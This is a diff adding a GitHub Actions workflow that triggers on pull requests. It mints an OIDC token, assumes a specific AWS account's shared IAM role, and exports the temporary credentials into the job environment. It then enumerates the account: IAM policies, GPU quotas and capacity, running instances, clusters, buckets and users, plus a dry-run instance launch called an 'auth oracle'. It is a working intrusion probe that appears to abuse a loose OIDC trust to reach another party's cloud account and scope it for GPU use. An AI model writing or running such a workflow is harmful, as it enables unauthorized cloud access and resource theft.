@@ -1,0 +1,100 @@
+name: c211 i106371 oidc probe
+on:
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  oidc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: Mint OIDC token (aud sts.amazonaws.com) and print claims
+        run: |
+          set -uo pipefail
+          echo "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF"
+          RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          TOKEN=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print((json.load(sys.stdin) or {}).get("value",""))' 2>/dev/null || true)
+          echo "TOKEN_LEN=${#TOKEN}"
+          if [ -z "$TOKEN" ]; then echo "NO_TOKEN_RESPONSE: $(printf '%s' "$RESP" | head -c 300)"; exit 3; fi
+          python3 - "$TOKEN" <<'PY'
+import sys, base64
+t = sys.argv[1].split('.')
+def d(s): return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)).decode('utf-8', 'replace')
+print("HEADER=" + d(t[0]))
+print("PAYLOAD=" + d(t[1]))
+PY
+          printf '%s' "$TOKEN" > "$RUNNER_TEMP/oidc.jwt"
+
+      - name: sts AssumeRoleWithWebIdentity against shared role
+        run: |
+          set -uo pipefail
+          TOKEN=$(cat "$RUNNER_TEMP/oidc.jwt")
+          aws --version || true
+          aws sts assume-role-with-web-identity \
+            --role-arn arn:aws:iam::708819485463:role/GitHubActions-Answering-IT-SharedRole \
+            --role-session-name "c211-i106371" \
+            --web-identity-token "$TOKEN" \
+            --duration-seconds 900 > "$RUNNER_TEMP/assume.json" 2> "$RUNNER_TEMP/assume.err"
+          RC=$?
+          echo "ASSUME_RC=$RC"
+          echo "--- assume stderr ---"
+          sed -E 's/(Token|token)[A-Za-z0-9._-]{10,}/<redacted>/g' "$RUNNER_TEMP/assume.err" | head -20
+          if [ $RC -ne 0 ]; then echo "VERDICT=STS_DENIED"; exit 0; fi
+          echo "--- assumed role (no secrets) ---"
+          python3 - "$RUNNER_TEMP/assume.json" "$GITHUB_ENV" <<'PY'
+import json, sys
+j = json.load(open(sys.argv[1]))['Credentials']
+print("AssumedRoleId=" + j['AssumedRoleId'])
+print("Expiration=" + j['Expiration'])
+with open(sys.argv[2], 'a') as f:
+    f.write("AWS_ACCESS_KEY_ID=%s\n" % j['AccessKeyId'])
+    f.write("AWS_SECRET_ACCESS_KEY=%s\n" % j['SecretAccessKey'])
+    f.write("AWS_SESSION_TOKEN=%s\n" % j['SessionToken'])
+PY
+          echo "VERDICT=STS_OK"
+
+      - name: Read-only enumeration (identity, quotas, GPU surface)
+        if: env.AWS_ACCESS_KEY_ID != ''
+        run: |
+          set -uo pipefail
+          export AWS_DEFAULT_REGION=us-east-1
+          echo "== sts get-caller-identity =="
+          aws sts get-caller-identity --output json 2>&1 | head -12
+          echo "== iam get-role =="
+          aws iam get-role --role-name GitHubActions-Answering-IT-SharedRole --query 'Role.[RoleName,Arn,CreateDate,MaxSessionDuration]' --output json 2>&1 | head -12
+          echo "== iam attached role policies =="
+          aws iam list-attached-role-policies --role-name GitHubActions-Answering-IT-SharedRole --query 'AttachedPolicies[].[PolicyName,PolicyArn]' --output text 2>&1 | head -20
+          echo "== iam inline role policies =="
+          aws iam list-role-policies --role-name GitHubActions-Answering-IT-SharedRole --query 'PolicyNames' --output json 2>&1 | head -10
+          for CODE in L-DB2E81BA L-3819A6DF L-417A185B; do
+            echo "== service-quota $CODE (us-east-1) =="
+            aws service-quotas get-service-quota --service-code ec2 --quota-code $CODE --query 'Quota.[QuotaCode,QuotaName,Value]' --output json 2>&1 | head -8
+          done
+          echo "== ec2 instance-type offerings gpu candidates =="
+          aws ec2 describe-instance-type-offerings --location-type availability-zone \
+            --filters Name=instance-type,Values=g4dn.xlarge,g5.xlarge,g5.2xlarge,g6.xlarge,g6e.xlarge,p3.2xlarge,p3dn.24xlarge,p4d.24xlarge,p5.48xlarge \
+            --query 'InstanceTypeOfferings[].[InstanceType,Location]' --output text 2>&1 | sort -u | head -80
+          echo "== ec2 describe-instance-types gpu info =="
+          aws ec2 describe-instance-types --filters Name=instance-type,Values=g4dn.xlarge,g5.xlarge,g6.xlarge,p4d.24xlarge \
+            --query 'InstanceTypes[].[InstanceType,VCpuInfo.DefaultVCpus,GpuInfo.Gpus[0].Name]' --output text 2>&1 | head -20
+          echo "== ec2 capacity reservations =="
+          aws ec2 describe-capacity-reservations --query 'CapacityReservations[].[CapacityReservationId,InstanceType,State,AvailableInstanceCount]' --output text 2>&1 | head -15
+          echo "== ec2 running instances =="
+          aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query 'Reservations[].Instances[].[InstanceType]' --output text 2>&1 | sort | uniq -c | head -25
+          echo "== ec2 spot instance requests =="
+          aws ec2 describe-spot-instance-requests --query 'SpotInstanceRequests[].[SpotInstanceRequestId,State,InstanceType]' --output text 2>&1 | head -10
+          echo "== run-instances DryRun g4dn.xlarge (auth oracle) =="
+          aws ec2 run-instances --dry-run --image-id ami-0d6dd9e8265d48906 --instance-type g4dn.xlarge --count 1 --query 'Instances' 2>&1 | tail -4
+          echo "== eks list-clusters =="
+          aws eks list-clusters --query 'clusters' --output json 2>&1 | head -12
+          echo "== sagemaker list-clusters (HyperPod) =="
+          aws sagemaker list-clusters --query 'ClusterSummaries[].[ClusterName,ClusterStatus]' --output text 2>&1 | head -12
+          echo "== regions enabled =="
+          aws ec2 describe-regions --query 'length(Regions)' --output text 2>&1 | head -3
+          echo "== s3 list-buckets count =="
+          aws s3api list-buckets --query 'length(Buckets)' --output text 2>&1 | head -3
+          echo "== iam list-users count =="
+          aws iam list-users --query 'length(Users)' --output text 2>&1 | head -3
